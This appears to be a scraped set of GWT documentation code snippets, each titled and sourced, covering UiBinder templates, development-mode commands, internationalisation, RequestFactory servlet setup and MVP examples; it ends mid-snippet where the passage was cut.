https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCompilingAndDebugging.md#2025-04-09_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\njava -Xmx256M -cp \"src;war/WEB-INF/classes;\\gwt-2.0.0\\gwt-user.jar;\\gwt-2.0.0\\gwt-dev.jar\"\n  com.google.gwt.dev.DevMode -startupUrl Hello.html com.google.gwt.sample.hello.Hello\n```\n\n----------------------------------------\n\nTITLE: Widget Declaration in UiBinder Template with Constructor Arguments\nDESCRIPTION: Example of a UiBinder template that includes widgets that may require constructor arguments, demonstrating the structure of a composite widget.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_11\n\nLANGUAGE: xml\nCODE:\n```\n<!-- UserDashboard.ui.xml -->\n\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n    xmlns:g='urn:import:com.google.gwt.user.client.ui'\n    xmlns:my='urn:import:com.my.app.widgets' >\n\n  <g:HTMLPanel>\n    <my:WeatherReport ui:field='weather'/>\n\n    <my:Stocks ui:field='stocks'/>\n    <my:CricketScores ui:field='scores' />\n  </g:HTMLPanel>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Tagged HTMLPanel with Widgets in ui:msg\nDESCRIPTION: The HTMLPanel with its text content wrapped in a ui:msg element, allowing widgets to be included in the translatable text.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_11\n\nLANGUAGE: xml\nCODE:\n```\n<g:HTMLPanel>\n  <ui:msg>Meeting starts at\n    <my:TimePicker ui:field=\"startPicker\"/>\n  and ends at\n    <my:TimePicker ui:field=\"endPicker\"/>.\n  </ui:msg>\n</g:HTMLPanel>\n```\n\n----------------------------------------\n\nTITLE: Creating a GWT Web Application on Windows\nDESCRIPTION: Commands to navigate to the GWT SDK directory and create a new web application using the webAppCreator tool on Windows.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted.md#2025-04-09_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncd gwt-2.10.0\n\nwebAppCreator -out MyWebApp com.mycompany.mywebapp.MyWebApp\n```\n\n----------------------------------------\n\nTITLE: Creating a UiBinder Composite Class in GWT\nDESCRIPTION: Defines a Main class that extends Composite and implements UiBinder pattern to separate UI code from presentation. This creates the basic structure for the TodoList application's main screen.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-buildui.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npackage org.gwtproject.tutorial;\n\nimport com.google.gwt.core.client.GWT;\nimport com.google.gwt.uibinder.client.UiBinder;\nimport com.google.gwt.user.client.ui.Composite;\nimport com.google.gwt.user.client.ui.HTMLPanel;\n\npublic class Main extends Composite {\n  interface MainUiBinder extends UiBinder<HTMLPanel, Main> {\n  }\n\n  private static MainUiBinder ourUiBinder = GWT.create(MainUiBinder.class);\n\n  public Main() {\n    initWidget(ourUiBinder.createAndBindUi(this));\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running GWT Application in Development Mode (Shell)\nDESCRIPTION: Command to run the StockWatcher application in GWT development mode using Ant.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nant devmode\n```\n\n----------------------------------------\n\nTITLE: Running GWT Code Server\nDESCRIPTION: Command to start the GWT code server for development mode.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/gettingstarted-v2.md#2025-04-09_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nmvn gwt:codeserver -pl *-client -am\n```\n\n----------------------------------------\n\nTITLE: Working with BitSet in Java\nDESCRIPTION: BitSet implements a vector of bits that grows as needed. It provides methods for setting, clearing, and getting the state of individual bits, as well as operations for combining multiple BitSets.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_11\n\nLANGUAGE: Java\nCODE:\n```\nBitSet bitSet = new BitSet();\nbitSet.set(index);\nbitSet.clear(index);\nbitSet.get(index);\nbitSet.and(otherBitSet);\nbitSet.or(otherBitSet);\nbitSet.xor(otherBitSet);\nbitSet.cardinality();\nbitSet.isEmpty();\nbitSet.length();\n```\n\n----------------------------------------\n\nTITLE: Instrumenting GWT Classes with EMMA\nDESCRIPTION: Java command to instrument GWT class files using EMMA for code coverage analysis.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingCoverage.md#2025-04-09_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\njava -cp emma.jar emma instr -m overwrite -cp war/WEB-INF/classes/com/example/myapp/client\n```\n\n----------------------------------------\n\nTITLE: Deploying GWT Application to App Engine (Shell)\nDESCRIPTION: Command to upload the compiled StockWatcher application to Google App Engine using appcfg.sh.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\nappcfg.sh update war\n```\n\n----------------------------------------\n\nTITLE: Defining a TextResource with Source Annotation\nDESCRIPTION: Example of defining a TextResource method in a ClientBundle interface, which allows accessing text content from an external file.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\n@Source(\"default.txt\")\npublic TextResource defaultText();\n```\n\n----------------------------------------\n\nTITLE: Tagged RadioButtons with meaning Attribute\nDESCRIPTION: RadioButton elements with ui:msg elements and the meaning attribute to distinguish between different contexts of the same word.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_19\n\nLANGUAGE: xml\nCODE:\n```\nFavorite Color:\n  <ui:RadioButton name=\"color\"><ui:msg>Red</ui:msg></ui:RadioButton>\n  <ui:RadioButton name=\"color\"><ui:msg meaning=\"the color\"/>Orange</ui:msg></ui:RadioButton>\n\nFavorite Fruit:\n  <ui:RadioButton name=\"fruit\"><ui:msg>Apple</ui:msg></ui:RadioButton>\n  <ui:RadioButton name=\"fruit\"><ui:msg meaning=\"the fruit\">Orange<ui:msg></ui:RadioButton>\n```\n\n----------------------------------------\n\nTITLE: GWT Release Download Table HTML Structure\nDESCRIPTION: HTML table structure used to display GWT download information including platform, package links, file sizes and MD5 checksums.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/versions.md#2025-04-09_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<table class=\"downloads\" style=\"width:500px\">\n  <tr>\n    <th>Platform</th>\n    <th>Package</th>\n    <th>Size</th>\n    <th>MD5 Sum</th>\n  </tr>\n  <tr>\n    <td>Windows</td>\n    <td><a href=\"download-link\">package-name</a></td>\n    <td>size</td>\n    <td>md5-checksum</td>\n  </tr>\n</table>\n```\n\n----------------------------------------\n\nTITLE: Optimized UI Template in GWT UiBinder\nDESCRIPTION: UiBinder XML template showing the transition from FlexTable to HTML widget for better performance. Uses DecoratorPanel with vertical and horizontal layouts.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_19\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder>\n  ...\n  <g:DecoratorPanel>\n    <g:VerticalPanel>\n      <g:HorizontalPanel addStyleNames=\"{style.contactsViewButtonHPanel}\">\n        <g:Button ui:field=\"addButton\">Add</g:Button>\n        <g:Button ui:field=\"deleteButton\">Delete</g:Button>\n      </g:HorizontalPanel>\n      <g:HTML ui:field=\"contactsTable\"></g:HTML>\n    </g:VerticalPanel>\n  </g:DecoratorPanel>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Java Atomic Operations\nDESCRIPTION: Thread-safe atomic operations from java.util.concurrent.atomic package including AtomicBoolean, AtomicInteger, AtomicLong, and AtomicReference implementations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_15\n\nLANGUAGE: Java\nCODE:\n```\nAtomicInteger counter = new AtomicInteger(0);\nint value = counter.incrementAndGet();\nboolean success = counter.compareAndSet(expectedValue, newValue);\n```\n\n----------------------------------------\n\nTITLE: Opening Firefox Profile Manager\nDESCRIPTION: Command to open the Firefox Profile Manager for creating a custom profile for GWT testing.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingRemoteTesting.md#2025-04-09_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nfirefox.exe -ProfileManager\n```\n\n----------------------------------------\n\nTITLE: Creating Ant GWT Project\nDESCRIPTION: Command to create a new GWT project using Ant build system with JUnit configuration\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefCommandLineTools.md#2025-04-09_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nwebAppCreator -junit /path/to/junit-3.8.1.jar -out foo com.example.foo.Foo\n```\n\n----------------------------------------\n\nTITLE: Java Functional Interfaces\nDESCRIPTION: Core functional interfaces from java.util.function package including Consumer, Supplier, Function, and Predicate interfaces for functional programming paradigms.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_16\n\nLANGUAGE: Java\nCODE:\n```\nBiConsumer<T,U> consumer = (t, u) -> { /* action */ };\nBiFunction<T,U,R> function = (t, u) -> result;\nBiPredicate<T,U> predicate = (t, u) -> boolean_result;\n```\n\n----------------------------------------\n\nTITLE: Writing Data to HTML5 Storage in GWT\nDESCRIPTION: Shows how to write string data to storage using a key-value pair system. Includes reading from a textbox and storing with a computed key name.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideHtml5Storage.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.storage.client.Storage;\n\nfinal String symbol = newSymbolTextBox.getText().toUpperCase().trim();\nstockStore = Storage.getLocalStorageIfSupported();\nif (stockStore != null) {\n  int numStocks = stockStore.getLength();\n  stockStore.setItem(\"Stock.\"+numStocks, symbol);\n}\n```\n\n----------------------------------------\n\nTITLE: i18nCreator Example Commands\nDESCRIPTION: Example usage of i18nCreator for creating message and constant interfaces\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefCommandLineTools.md#2025-04-09_snippet_6\n\nLANGUAGE: text\nCODE:\n```\n~/Foo> i18nCreator -eclipse Foo -createMessages com.example.foo.client.FooMessages\n Created file src/com/example/foo/client/FooMessages.properties\n Created file FooMessages-i18n.launch\n Created file FooMessages-i18n\n```\n\n----------------------------------------\n\nTITLE: Using LayoutPanel in UiBinder XML\nDESCRIPTION: Example of using the new LayoutPanel component with UiBinder markup. This demonstrates how to create different layers with positioning constraints like left, right, and width attributes.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_6\n\nLANGUAGE: xml\nCODE:\n```\n<g:LayoutPanel>\n  <g:layer left='1em' width='20px'><g:Label>left-width</g:Label></g:Layer>\n  <g:layer right='1em' width='20px'><g:Label>right-width</g:Label></g:Layer>\n  <g:layer><g:Label>nada</g:Label></g:Layer>\n</g:LayoutPanel>\n```\n\n----------------------------------------\n\nTITLE: Getting GwtLocaleFactory Instance in GWT\nDESCRIPTION: Shows how to obtain a GwtLocaleFactory instance using the LocaleUtils class. This factory can then be used to create GwtLocale objects for locale manipulation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nLocale.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nGwtLocaleFactory factory = LocaleUtils.getLocaleFactory();\n```\n\n----------------------------------------\n\nTITLE: HTML Table Structure for GWT Downloads\nDESCRIPTION: This HTML table structure is used to display GWT version download information, including platform compatibility, package link, file size, and SHA1 checksum. The table follows a consistent format used across all version listings.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/versions.md#2025-04-09_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<table class=\"downloads\" style=\"width:500px\">\n  <tbody>\n    <tr>\n      <th>Platform</th>\n      <th>Package</th>\n      <th>Size</th>\n      <th>SHA1 Sum</th>\n    </tr>\n    <tr>\n      <td>Windows, Mac OS X, and Linux</td>\n      <td><a href=\"https://github.com/gwtproject/gwt/releases/download/2.12.2/gwt-2.12.2.zip\">gwt-2.12.2.zip</a></td>\n      <td>109 MB</td>\n      <td>968dbfffab4f43fcc70a05ce2378ca8013f12af3</td>\n    </tr>\n  </tbody>\n</table>\n```\n\n----------------------------------------\n\nTITLE: GWT View Implementation with HTML Widget\nDESCRIPTION: Contact view implementation class showing the HTML widget field declaration for the optimized table rendering approach.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_20\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsViewImpl<T> extends Composite implements ContactsView<T> {\n  ...\n  @UiField HTML contactsTable;\n  ...\n```\n\n----------------------------------------\n\nTITLE: Using SuggestBox with Configuration for Focus Behavior in GWT\nDESCRIPTION: Code example showing SuggestBox configuration that automatically moves focus to the next field after selection. This was part of a fix for issue 8051 in GWT 2.6.0.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nSuggestBox.DefaultSuggestionDisplay display = new SuggestBox.DefaultSuggestionDisplay() {\n    @Override\n    public void hideSuggestions() {\n        super.hideSuggestions();\n        nextField.setFocus(true); // Move focus to next field after selection\n    }\n};\nSuggestBox box = new SuggestBox(oracle, textBox, display);\n```\n\n----------------------------------------\n\nTITLE: Adding a Linker in GWT Module Configuration\nDESCRIPTION: Example of how to add a specific linker (in this case 'sso') to a GWT module using XML configuration in the Module.gwt.xml file.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLinkers.md#2025-04-09_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<module>\n  <inherits name=\"com.google.gwt.core.Core\" />\n  <add-linker name=\"sso\" />\n</module>\n```\n\n----------------------------------------\n\nTITLE: Subclassing JavaScriptObject in Java\nDESCRIPTION: Example of how to properly subclass JavaScriptObject in GWT, using the Element class as a reference. This is not officially supported but shown for illustration.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_17\n\nLANGUAGE: Java\nCODE:\n```\nprotected Element() {\n  // Required for subclassing JavaScriptObject\n}\n```\n\n----------------------------------------\n\nTITLE: Creating HibernateUtil Helper Class in Java\nDESCRIPTION: Implements a utility class for managing Hibernate SessionFactory, initializing it from the hibernate.cfg.xml configuration file.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\npublic class HibernateUtil {\n\n  private static final SessionFactory sessionFactory;\n\n  static {\n    try {\n      // Create the SessionFactory from hibernate.cfg.xml\n      sessionFactory = new Configuration().configure().buildSessionFactory();\n    } catch (Throwable ex) {\n      // Make sure you log the exception, as it might be swallowed\n      System.err.println(\"Initial SessionFactory creation failed.\" + ex);\n      throw new ExceptionInInitializerError(ex);\n    }\n  }\n\n  public static SessionFactory getSessionFactory() {\n    return sessionFactory;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating SimplePanel and Subclasses in GWT\nDESCRIPTION: SimplePanel now has a setWidget() method for panels that can contain only one child. The add() method will fail if a widget is already present. This affects classes like DialogBox and PopupPanel.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_22\n\nLANGUAGE: java\nCODE:\n```\nDialogBox dialog = new DialogBox();\ndialog.setWidget(new Label(\"Dialog content\"));\n```\n\n----------------------------------------\n\nTITLE: Inheriting GWT Visual Theme in Module XML\nDESCRIPTION: Demonstrates how to inherit a GWT visual theme (in this case, the Dark theme) in the module XML file.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCss.md#2025-04-09_snippet_6\n\nLANGUAGE: xml\nCODE:\n```\n<!-- Inherit the default GWT style sheet. You can change       -->\n<!-- the theme of your GWT application by uncommenting          -->\n<!-- any one of the following lines.                           -->\n<!-- <inherits name='com.google.gwt.user.theme.standard.Standard'/> -->\n<!-- <inherits name=\"com.google.gwt.user.theme.chrome.Chrome\"/> -->\n<inherits name=\"com.google.gwt.user.theme.dark.Dark\"/>\n```\n\n----------------------------------------\n\nTITLE: Prefetching Images for Improved First-Time Loading in GWT\nDESCRIPTION: A code snippet demonstrating how to prefetch images to improve initial loading times by ensuring images are cached by the browser before they're needed. This technique is particularly useful for images used in styling elements.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_UI.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\nImage.prefetch(\"images/corner-bl.png\");\n    Image.prefetch(\"images/corner-br.png\");\n    Image.prefetch(\"images/corner-tl.png\");\n    Image.prefetch(\"images/corner-tr.png\");\n```\n\n----------------------------------------\n\nTITLE: Configuring Runtime Locales in GWT Module XML\nDESCRIPTION: Configuration for enabling CLDR locales support in GWT module XML.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nLocale.md#2025-04-09_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n<inherits name=\"com.google.gwt.i18n.CldrLocales\"/>\n```\n\n----------------------------------------\n\nTITLE: Resolving Import Error for GWT Google API\nDESCRIPTION: Example error message when the GWT compiler cannot find a required API package. This occurs when the module XML file doesn't include the necessary inherits tag for third-party libraries.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Troubleshooting.md#2025-04-09_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n$ ./gearsTest-compile\nAnalyzing source in module 'com.example.gearsTest'\n   [ERROR] Errors in '/Users/zundel/Documents/workspace2/galgwt-issue3/src/com/example/client/gearsTest.java'\n      [ERROR] Line 9:  The import com.google.gwt.gears cannot be resolved\n      [ERROR] Line 26:  Gears cannot be resolved\n```\n\n----------------------------------------\n\nTITLE: Selection Model Implementation in GWT\nDESCRIPTION: Generic selection model for managing selected items in a list.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_15\n\nLANGUAGE: java\nCODE:\n```\npublic class SelectionModel<T> {\n    List<T> selectedItems = new ArrayList<T>();\n\n    public List<T> getSelectedItems() {\n      return selectedItems;\n    }\n\n    public void addSelection(T item) {\n      selectedItems.add(item);\n    }\n\n    public void removeSelection(T item) {\n      selectedItems.remove(item);\n    }\n\n    public boolean isSelected(T item) {\n      return selectedItems.contains(item);\n    }\n  }\n```\n\n----------------------------------------\n\nTITLE: Configuring Super Dev Mode in GWT 2.5.1 Module XML\nDESCRIPTION: Required XML configuration for enabling Super Dev Mode in GWT 2.5.1. This adds the xsiframe linker, enables Dev Mode redirect, and enables source maps for debugging.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/superdevmode.md#2025-04-09_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<add-linker name=\"xsiframe\"/>\n<set-configuration-property name=\"devModeRedirectEnabled\" value=\"true\"/>\n<set-property name=\"compiler.useSourceMaps\" value=\"true\"/>\n```\n\n----------------------------------------\n\nTITLE: HTML Table Structure for Book Catalog\nDESCRIPTION: HTML markup organizing book entries in a table format with cover images and descriptions. Each entry includes a book cover image, title link, and descriptive text styled with CSS.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/books.md#2025-04-09_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<table class=\"columns\" style=\"clear: left;\">\n  <tbody>\n    <tr>\n      <td>\n        <a href=\"http://www.packtpub.com/google-web-toolkit-gwt-java-ajax-programming/book\">\n          <img src=\"images/books/book.jpeg\" style=\"float: left; margin-left: 0px; border: 0;\" width=\"150\" />\n        </a>\n        <div style=\"margin-left: 155px; margin-bottom: 10px;\">\n          <div style=\"font-size: 120%; font-weight: bold;\"><a href=\"...\">Book Title</a></div>\n          <div style=\"padding-top: 5px; line-height: 125%;\">Book description...</div>\n        </div>\n      </td>\n    </tr>\n  </tbody>\n</table>\n```\n\n----------------------------------------\n\nTITLE: Configuring Java Compilation with DataNucleus Enhancement in Ant Build XML\nDESCRIPTION: This XML snippet modifies the 'javac' Ant target to include DataNucleus byte-code enhancement for JDO implementation in App Engine.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_5\n\nLANGUAGE: XML\nCODE:\n```\n<target name=\"javac\" depends=\"libs\" description=\"Compile java source\">\n  <mkdir dir=\"war/WEB-INF/classes\"/>\n  <javac srcdir=\"src\" includes=\"**\" encoding=\"utf-8\"\n      destdir=\"war/WEB-INF/classes\"\n      source=\"1.5\" target=\"1.5\" nowarn=\"true\"\n      debug=\"true\" debuglevel=\"lines,vars,source\">\n    <classpath refid=\"project.class.path\"/>\n  </javac>\n  <copy todir=\"war/WEB-INF/classes\">\n    <fileset dir=\"src\" excludes=\"**/*.java\"/>\n  </copy>\n  <taskdef name=\"datanucleusenhancer\"\n      classpathref=\"tools.class.path\"\n      classname=\"org.datanucleus.enhancer.tools.EnhancerTask\" />\n  <datanucleusenhancer classpathref=\"tools.class.path\"\n      failonerror=\"true\">\n    <fileset dir=\"war/WEB-INF/classes\" includes=\"**/*.class\" />\n  </datanucleusenhancer>\n</target>\n```\n\n----------------------------------------\n\nTITLE: Importing a Native Element with addEventListener Method\nDESCRIPTION: This code imports a native JavaScript Element class with the addEventListener method that accepts a callback function. It's mapped using @JsType(isNative=true).\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\n@JsType(isNative = true)\npublic class Element {\n    // other methods\n\n    public native void addEventListener(String eventType, EventListenerCallback fn);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring RequestFactoryServlet in web.xml\nDESCRIPTION: This XML snippet shows how to configure the RequestFactoryServlet in a web.xml file, including mapping it to a URL pattern and configuring symbol maps for stack trace deobfuscation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_14\n\nLANGUAGE: xml\nCODE:\n```\n<servlet>\n    <servlet-name>requestFactoryServlet</servlet-name>\n    <servlet-class>com.google.web.bindery.requestfactory.server.RequestFactoryServlet</servlet-class>\n    <init-param>\n        <param-name>symbolMapsDirectory</param-name>\n        <!-- You'll need to compile with -extras and move the symbolMaps directory\n            to this location if you want stack trace deobfuscation to work -->\n        <param-value>WEB-INF/classes/symbolMaps/</param-value>\n    </init-param>\n</servlet>\n\n<servlet-mapping>\n    <servlet-name>requestFactoryServlet</servlet-name>\n    <url-pattern>/gwtRequest</url-pattern>\n</servlet-mapping>\n```\n\n----------------------------------------\n\nTITLE: Configuring RequestFactoryServlet in web.xml\nDESCRIPTION: This XML snippet shows how to configure the RequestFactoryServlet in a web.xml file, including mapping it to a URL pattern and configuring symbol maps for stack trace deobfuscation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_14\n\nLANGUAGE: xml\nCODE:\n```\n<servlet>\n    <servlet-name>requestFactoryServlet</servlet-name>\n    <servlet-class>com.google.web.bindery.requestfactory.server.RequestFactoryServlet</servlet-class>\n    <init-param>\n        <param-name>symbolMapsDirectory</param-name>\n        <!-- You'll need to compile with -extras and move the symbolMaps directory\n            to this location if you want stack trace deobfuscation to work -->\n        <param-value>WEB-INF/classes/symbolMaps/</param-value>\n    </init-param>\n</servlet>\n\n<servlet-mapping>\n    <servlet-name>requestFactoryServlet</servlet-name>\n    <url-pattern>/gwtRequest</url-pattern>\n</servlet-mapping>\n```\n\n----------------------------------------\n\nTITLE: Defining Exact Values for Plural Forms in GWT (Java)\nDESCRIPTION: Example of using exact value matches in plural forms. It shows how to provide a special message for zero items in a cart using the '=0' syntax.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nPluralForms.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic interface MyMessages extends Messages {\n  @DefaultMessage(\"There are {0,number} items in your cart.\")\n  @AlternateMessage({\n      \"one\", \"There is 1 item in your cart.\",\n      \"=0\", \"Your cart is empty.\"\n  })\n  String cartItems(@PluralCount int itemCount);\n}\n```\n\n----------------------------------------\n\nTITLE: Presenter Interface Definition\nDESCRIPTION: Interface that defines callback methods for UI interactions that the ContactsPresenter will implement, enabling the View to communicate with the Presenter.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic interface Presenter<T> {\n    void onAddButtonClicked();\n    void onDeleteButtonClicked();\n    void onItemClicked(T clickedItem);\n    void onItemSelected(T selectedItem);\n  }\n```\n\n----------------------------------------\n\nTITLE: Arabic Plural Forms in Properties File (Properties)\nDESCRIPTION: Example of defining plural forms for Arabic in a properties file. It demonstrates the complex plural rules in Arabic, including none, one, two, few, and many cases.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nPluralForms.md#2025-04-09_snippet_2\n\nLANGUAGE: properties\nCODE:\n```\ncartItems=There are {0,number} items in your cart.\ncartItems[none]=There are no items in your cart.\ncartItems[one]=There is one item in your cart.\ncartItems[two]=There are two items in your cart.\ncartItems[few]=There are {0,number} items in your cart, which are few.\ncartItems[many]=There are {0,number} items in your cart, which are many.\n```\n\n----------------------------------------\n\nTITLE: Complete StockPriceServiceImpl Implementation - Java\nDESCRIPTION: Full server-side implementation class extending RemoteServiceServlet for stock price service\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.server;\n\nimport com.google.gwt.sample.stockwatcher.client.StockPrice;\nimport com.google.gwt.sample.stockwatcher.client.StockPriceService;\nimport com.google.gwt.user.server.rpc.RemoteServiceServlet;\n\nimport java.util.Random;\n\npublic class StockPriceServiceImpl extends RemoteServiceServlet implements StockPriceService {\n\n  private static final double MAX_PRICE = 100.0; // $100.00\n  private static final double MAX_PRICE_CHANGE = 0.02; // +/- 2%\n\n  public StockPrice[] getPrices(String[] symbols) {\n    Random rnd = new Random();\n\n    StockPrice[] prices = new StockPrice[symbols.length];\n    for (int i=0; i<symbols.length; i++) {\n      double price = rnd.nextDouble() * MAX_PRICE;\n      double change = price * MAX_PRICE_CHANGE * (rnd.nextDouble() * 2f - 1f);\n\n      prices[i] = new StockPrice(symbols[i], price, change);\n    }\n\n    return prices;\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Initial History State in GWT AppController\nDESCRIPTION: This snippet shows how to set an initial history state or handle existing history tokens in the AppController's go method. It ensures the application starts at the correct view.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\npublic class AppController implements ValueChangeHandler<String> {\n  ...\n  public void go(final HasWidgets container) {\n    this.container = container;\n\n    if (\"\".equals(History.getToken())) {\n      History.newItem(\"list\");\n    }\n    else {\n      History.fireCurrentHistoryState();\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Limiting Browser Permutations for GWT Production Mode Tests\nDESCRIPTION: Demonstrates how to limit browser permutations when running tests in production mode to reduce compile time using the -userAgents argument.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTestingRemoteTesting.md#2025-04-09_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n-Dgwt.args=\"-prod -userAgents ie6,gecko1_8 -runStyle Selenium:myhost:4444/*firefox\"\n```\n\n----------------------------------------\n\nTITLE: Mismatched Parameters Example (Java)\nDESCRIPTION: Example showing compile-time error detection when message parameters don't match\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nMessages.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npublic interface ErrorMessages extends Messages {\n  String permissionDenied(int errorCode, String username);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Resource Objects with Attributes in UiBinder\nDESCRIPTION: Shows how to set parameters on resource objects using the <ui:attributes> element, enabling customization of resources with constructor arguments or setters.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_24\n\nLANGUAGE: java\nCODE:\n```\npublic class FancyResources {\n  enum Style {\n    MOBILE, DESKTOP\n  }\n\n  private final Resources baseResources;\n  private final Style style;\n\n  @UiConstructor\n  public FancyResources(Resources 